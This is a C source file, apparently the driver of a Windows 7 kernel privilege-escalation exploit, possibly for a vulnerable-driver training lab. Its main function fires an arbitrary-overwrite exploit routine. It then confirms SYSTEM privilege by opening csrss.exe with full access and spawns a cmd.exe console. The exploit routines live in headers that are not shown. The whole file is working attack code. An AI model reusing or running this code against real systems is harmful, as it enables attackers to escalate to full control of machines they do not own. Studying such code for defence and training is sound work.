#include "KernelExploit.h"
#include "Common.h"
#include "ArbitraryOverwrite.h"
#include "NullPointerDereference.h"

BOOLEAN 
IsSystemPrivilege(
	_In_ PWCHAR pwchTargetProcessName
)
{
	BOOLEAN bRetValue = FALSE;
	ULONG ulProcessId = 0;
	HANDLE hProcessSnapshot = NULL;
	PROCESSENTRY32 ProcessEntry32 = { 0, };
	HANDLE hProcess = NULL;

	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

	hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (!hProcessSnapshot)
	{
		goto _RET;
	}

	if (!Process32First(hProcessSnapshot, &ProcessEntry32))
	{
		goto _RET;
	}

	do
	{
		if (0 == wcscmp(pwchTargetProcessName, ProcessEntry32.szExeFile))
		{
			ulProcessId = ProcessEntry32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnapshot, &ProcessEntry32));

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ulProcessId);

	if (!hProcess)
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
	}

	if (NULL != hProcessSnapshot)
	{
		CloseHandle(hProcessSnapshot);
	}

	return bRetValue;
}

int main(void)
{
	STARTUPINFO StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInformation = { 0, };

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	ArbitaryOverWriteExploitForWin7();
	//NullPointerDereferenceExploitForWin7();

	if (!IsSystemPrivilege(L"csrss.exe"))
	{
		goto _RET;
	}

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcess(
		L"C:\\Windows\\System32\\cmd.exe",
		L"/T:17",
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInformation
		))
	{
		goto _RET;
	}	

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

_RET:
	if (NULL != ProcessInformation.hThread)
	{
		CloseHandle(ProcessInformation.hThread);
	}

	if (NULL != ProcessInformation.hProcess)
	{
		CloseHandle(ProcessInformation.hProcess);
	}

	return 0;
}